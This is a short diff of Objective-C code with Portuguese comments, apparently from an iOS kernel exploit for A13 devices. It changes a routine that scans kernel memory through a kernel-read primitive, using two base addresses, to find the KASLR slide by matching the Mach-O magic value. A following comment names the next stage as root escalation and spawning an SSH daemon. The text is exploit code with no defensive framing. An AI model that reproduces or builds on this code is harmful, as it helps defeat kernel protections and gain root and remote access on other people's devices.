@@ -39,18 +39,23 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 - (uint64_t)getKernelSlide {
     if (_kernel_slide != 0) return _kernel_slide;
 
-    // Aumentamos para 0x200000 iterações (varre uma área maior de memória)
-    for (uint64_t i = 0; i < 0x200000; i++) {
-        uint64_t addr = 0xFFFFFFF007004000 + (i * 0x4000);
-        uint64_t val = [self kread64:addr];
-        
-        if ((val & 0xFFFFFFFF) == 0xfeedfacf) {
-            _kernel_slide = (i * 0x4000);
-            return _kernel_slide;
+    // Tenta dois endereços base comuns em versões beta do A13
+    uint64_t bases[] = {0xFFFFFFF007004000, 0xFFFFFFF009004000};
+    
+    for (int b = 0; b < 2; b++) {
+        for (uint64_t i = 0; i < 0x100000; i++) {
+            uint64_t addr = bases[b] + (i * 0x4000);
+            uint64_t val = [self kread64:addr];
+            
+            if ((val & 0xFFFFFFFF) == 0xfeedfacf) {
+                _kernel_slide = (i * 0x4000);
+                return _kernel_slide;
+            }
         }
     }
     return 0;
 }
+
 
 
 // 4. TRIGGER: ESCALADA ROOT -> SPAWN SSHD
